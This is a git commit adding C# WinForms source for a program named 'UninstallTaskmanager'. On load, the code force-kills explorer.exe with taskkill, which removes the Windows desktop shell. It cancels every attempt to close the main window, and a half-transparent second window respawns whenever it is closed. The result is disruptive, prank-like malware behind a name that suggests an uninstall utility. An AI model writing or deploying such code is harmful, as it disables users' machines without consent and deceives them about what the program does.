fb834b2589f88bd925d700024ff1c42fcb272c6e
Hardlyarabit <50185658+Hardlyarabit@users.noreply.github.com>
2020-04-27 15:08:11 -1000

    Add files via upload

---
+++ UninstallTaskmanager/Form1.cs
@@ -0,0 +1,43 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace UninstallTaskmanager
+{
+    public partial class Form1 : Form
+    {
+        private bool enable;
+
+        public Form1()
+        {
+            InitializeComponent();  
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            var form2 = new Form2();
+            form2.Show();
+            Process.Start(@"C:\Windows\System32\taskkill.exe", @"/F /IM explorer.exe");
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+        }
+    }
+
+}
---
+++ UninstallTaskmanager/Form2.cs
@@ -0,0 +1,33 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace UninstallTaskmanager
+{
+    public partial class Form2 : Form
+    {
+        public Form2()
+        {
+            InitializeComponent();
+            this.Opacity = .5;
+
+        }
+
+        private void Form2_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            var form2 = new Form2();
+            form2.Show();
+        }
+    }
+}
